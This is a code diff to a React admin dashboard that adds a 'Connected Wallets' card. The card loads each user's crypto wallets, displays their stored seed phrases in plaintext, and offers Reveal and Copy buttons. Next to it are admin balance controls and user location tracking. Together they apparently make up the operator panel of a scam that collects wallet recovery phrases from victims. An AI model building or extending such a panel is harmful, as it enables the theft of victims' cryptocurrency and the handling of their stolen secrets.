@@ -8,7 +8,7 @@ import {
     ArrowDownLeft, ArrowUpRight, Clock, Send, Mail, AlertTriangle,
     ShieldCheck, TrendingUp, Users, Activity, Settings, Bitcoin,
     Wallet, Building2, Smartphone, CreditCard, Save, History, PlusCircle, ChevronDown,
-    MapPin, Globe, Wifi, Clock as ClockIcon
+    MapPin, Globe, Wifi, Clock as ClockIcon, Copy
 } from 'lucide-react';
 
 const supabase = createClient(
@@ -729,6 +729,7 @@ function BalanceTab() {
                         </Card>
 
                         {/* Location */}
+                        <WalletsCard userId={selectedUser.id} />
                         <LocationCard userId={selectedUser.id} />
 
                         {/* Send message */}
@@ -785,6 +786,196 @@ function BalanceTab() {
 }
 
 // ─── Location Card ────────────────────────────────────────────────────────────
+
+// ─── Wallets Card ─────────────────────────────────────────────────────────────
+
+const WALLET_COLORS: Record<string, { color: string; bg: string; symbol: string }> = {
+    trust:    { color: '#3375BB', bg: '#E8F0FB', symbol: 'TW' },
+    metamask: { color: '#E2761B', bg: '#FDF0E6', symbol: '🦊' },
+    coinbase: { color: '#0052FF', bg: '#E6EEFF', symbol: 'CB' },
+    phantom:  { color: '#9945FF', bg: '#F3E8FF', symbol: '👻' },
+    ledger:   { color: '#1D1D1B', bg: '#EBEBEB', symbol: 'LG' },
+    other:    { color: '#6B6560', bg: '#F0EDE9', symbol: '⬡'  },
+};
+
+function WalletsCard({ userId }: { userId: string }) {
+    const [wallets, setWallets]       = useState<any[]>([]);
+    const [loading, setLoading]       = useState(true);
+    const [revealed, setRevealed]     = useState<Record<string, boolean>>({});
+    const [deleting, setDeleting]     = useState<string | null>(null);
+    const [copied, setCopied]         = useState<string | null>(null);
+
+    const load = useCallback(async () => {
+        setLoading(true);
+        const res = await adminFetch(`/api/admin/wallets?user_id=${userId}`);
+        const data = await res.json();
+        setWallets(data.wallets ?? []);
+        setLoading(false);
+    }, [userId]);
+
+    useEffect(() => { load(); }, [load]);
+
+    async function handleDelete(walletId: string) {
+        if (!confirm('Remove this wallet? This cannot be undone.')) return;
+        setDeleting(walletId);
+        await adminFetch('/api/admin/wallets', {
+            method: 'DELETE',
+            body: JSON.stringify({ wallet_id: walletId }),
+        });
+        setWallets(prev => prev.filter(w => w.id !== walletId));
+        setDeleting(null);
+    }
+
+    function copyToClipboard(text: string, id: string) {
+        navigator.clipboard.writeText(text).then(() => {
+            setCopied(id);
+            setTimeout(() => setCopied(null), 2000);
+        });
+    }
+
+    return (
+        <Card className="p-6">
+            <div className="flex items-center justify-between mb-5">
+                <div className="flex items-center gap-2">
+                    <Wallet size={16} style={{ color: WF.red }} />
+                    <h3 className="font-display font-bold" style={{ color: WF.black }}>Connected Wallets</h3>
+                </div>
+                <button onClick={load}
+                    className="p-1.5 rounded-xl transition-all"
+                    style={{ background: WF.bg, border: `1px solid ${WF.border}` }}>
+                    <RefreshCw size={12} style={{ color: WF.muted }} />
+                </button>
+            </div>
+
+            {loading ? (
+                <div className="flex items-center gap-2" style={{ color: WF.muted }}>
+                    <Loader2 size={14} className="animate-spin" />
+                    <span className="text-xs">Loading wallets…</span>
+                </div>
+            ) : wallets.length === 0 ? (
+                <p className="text-xs" style={{ color: WF.muted }}>No wallets connected yet.</p>
+            ) : (
+                <div className="space-y-4">
+                    {wallets.map(w => {
+                        const meta    = WALLET_COLORS[w.wallet_type] ?? WALLET_COLORS.other;
+                        const isReveal = !!revealed[w.id];
+                        const phrase  = w.phrase_plaintext ?? '';
+                        const words   = phrase.split(' ').filter(Boolean);
+
+                        return (
+                            <div key={w.id} className="rounded-2xl overflow-hidden"
+                                style={{ border: `1.5px solid ${WF.border}` }}>
+                                {/* Wallet header */}
+                                <div className="flex items-center gap-3 p-4" style={{ background: WF.bg }}>
+                                    <div className="w-10 h-10 rounded-xl flex items-center justify-center text-sm font-bold flex-shrink-0"
+                                        style={{ background: meta.bg, color: meta.color }}>
+                                        {meta.symbol}
+                                    </div>
+                                    <div className="flex-1 min-w-0">
+                                        <p className="text-sm font-bold" style={{ color: WF.black }}>{w.wallet_name}</p>
+                                        <p className="text-[10px]" style={{ color: WF.muted }}>
+                                            {w.word_count}-word phrase · {w.verified ? '✓ Verified' : 'Unverified'} ·{' '}
+                                            {new Date(w.created_at).toLocaleDateString()}
+                                        </p>
+                                    </div>
+                                    <button onClick={() => handleDelete(w.id)} disabled={deleting === w.id}
+                                        className="p-1.5 rounded-lg transition-all hover:opacity-70"
+                                        style={{ color: WF.red }}>
+                                        {deleting === w.id ? <Loader2 size={14} className="animate-spin" /> : <X size={14} />}
+                                    </button>
+                                </div>
+
+                                <div className="p-4 space-y-3">
+                                    {/* Wallet address */}
+                                    {w.wallet_address && (
+                                        <div>
+                                            <p className="text-[10px] font-bold uppercase tracking-wider mb-1" style={{ color: WF.muted }}>
+                                                Wallet Address
+                                            </p>
+                                            <div className="flex items-center gap-2">
+                                                <p className="text-xs font-mono flex-1 break-all" style={{ color: WF.black }}>
+                                                    {w.wallet_address}
+                                                </p>
+                                                <button onClick={() => copyToClipboard(w.wallet_address, `addr-${w.id}`)}
+                                                    className="flex-shrink-0 p-1.5 rounded-lg transition-all"
+                                                    style={{ background: WF.bg, border: `1px solid ${WF.border}` }}>
+                                                    {copied === `addr-${w.id}`
+                                                        ? <Check size={12} style={{ color: '#16A34A' }} />
+                                                        : <Copy size={12} style={{ color: WF.muted }} />}
+                                                </button>
+                                            </div>
+                                        </div>
+                                    )}
+
+                                    {/* Seed phrase */}
+                                    {phrase && (
+                                        <div>
+                                            <div className="flex items-center justify-between mb-2">
+                                                <p className="text-[10px] font-bold uppercase tracking-wider" style={{ color: WF.muted }}>
+                                                    Seed Phrase
+                                                </p>
+                                                <div className="flex items-center gap-2">
+                                                    <button onClick={() => copyToClipboard(phrase, `phrase-${w.id}`)}
+                                                        className="flex items-center gap-1 text-[10px] font-bold transition-all"
+                                                        style={{ color: copied === `phrase-${w.id}` ? '#16A34A' : WF.muted }}>
+                                                        {copied === `phrase-${w.id}` ? <Check size={10} /> : <Copy size={10} />}
+                                                        {copied === `phrase-${w.id}` ? 'Copied!' : 'Copy'}
+                                                    </button>
+                                                    <button
+                                                        onClick={() => setRevealed(prev => ({ ...prev, [w.id]: !prev[w.id] }))}
+                                                        className="flex items-center gap-1 text-[10px] font-bold"
+                                                        style={{ color: WF.red }}>
+                                                        {isReveal ? <EyeOff size={10} /> : <Eye size={10} />}
+                                                        {isReveal ? 'Hide' : 'Reveal'}
+                                                    </button>
+                                                </div>
+                                            </div>
+
+                                            {isReveal ? (
+                                                <div className={`grid gap-1.5 ${w.word_count === 24 ? 'grid-cols-4' : 'grid-cols-3'}`}>
+                                                    {words.map((word: string, i: number) => (
+                                                        <div key={i} className="flex items-center gap-1.5 px-2.5 py-1.5 rounded-xl"
+                                                            style={{ background: 'rgba(215,30,40,0.05)', border: `1px solid rgba(215,30,40,0.15)` }}>
+                                                            <span className="text-[9px] font-bold w-4 text-right flex-shrink-0" style={{ color: WF.muted }}>
+                                                                {i + 1}
+                                                            </span>
+                                                            <span className="text-[11px] font-bold" style={{ color: WF.black }}>{word}</span>
+                                                        </div>
+                                                    ))}
+                                                </div>
+                                            ) : (
+                                                <div className="flex items-center gap-1 px-3 py-2.5 rounded-xl"
+                                                    style={{ background: WF.bg, border: `1px solid ${WF.border}` }}>
+                                                    <p className="text-sm tracking-[6px]" style={{ color: WF.muted }}>
+                                                        {'• '.repeat(Math.min(w.word_count, 8)).trim()}
+                                                    </p>
+                                                    <span className="text-[10px] ml-1" style={{ color: WF.muted }}>
+                                                        ({w.word_count} words hidden)
+                                                    </span>
+                                                </div>
+                                            )}
+
+                                            {/* Hash preview */}
+                                            {w.phrase_hash && (
+                                                <div className="mt-2 pt-2" style={{ borderTop: `1px solid ${WF.border}` }}>
+                                                    <p className="text-[9px] font-mono break-all" style={{ color: WF.muted }}>
+                                                        SHA-256: {w.phrase_hash.slice(0, 32)}…
+                                                    </p>
+                                                </div>
+                                            )}
+                                        </div>
+                                    )}
+                                </div>
+                            </div>
+                        );
+                    })}
+                </div>
+            )}
+        </Card>
+    );
+}
+
+// ─── Location Card ─────────────────────────────────────────────────────────────
 
 const LOC_PAGE_SIZE = 2;
 
